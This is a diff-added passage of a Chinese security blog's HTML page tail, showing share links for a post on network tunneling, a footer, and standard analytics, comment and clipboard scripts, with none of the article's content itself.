+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/&title=网络隧道：突破内网的通行证"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/&name=网络隧道：突破内网的通行证&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/&t=网络隧道：突破内网的通行证"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2022-2025
+        Funsiooo
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">首页</a></li><!--
+        --><!--
+          --><li><a href="/archives/">归档</a></li><!--
+        --><!--
+          --><li><a href="/search/">搜索</a></li><!--
+        --><!--
+          --><li><a href="/tags/">标签</a></li><!--
+        --><!--
+          --><li><a href="/about/">关于</a></li><!--
+        -->
+          </ul>
+        </nav>        
+      </div>
+
+      <div class="footer-midle">
+        <nav>
+          <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+              <span id="busuanzi_container_page_pv">
+			  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+	      </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?47a5bc2b41144f91553c5eefd4999c0d";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'boom';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+<!-- FancyBox -->
+
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+
+
+</body>
+</html>
